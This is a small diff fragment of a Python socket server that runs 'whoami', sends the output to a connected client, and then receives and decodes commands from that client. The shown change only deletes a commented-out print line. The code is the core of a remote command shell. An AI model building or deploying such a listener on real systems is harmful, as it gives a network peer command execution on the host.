@@ -11,7 +11,6 @@ def server(host, port):
         text = os.popen('whoami').read() #run the whoami command
         data = text.encode('ascii') #encode the results of whoami to ascii
         c.send(data) #send the ascii-encoded results
-        #print(c.recv(1024).decode('ascii')) #print the receipt
         if text.strip() != 'root': #make sure the server isn't logged in as root
             data = c.recv(1024) #receive input
             command = data.decode('ascii') #decode the command
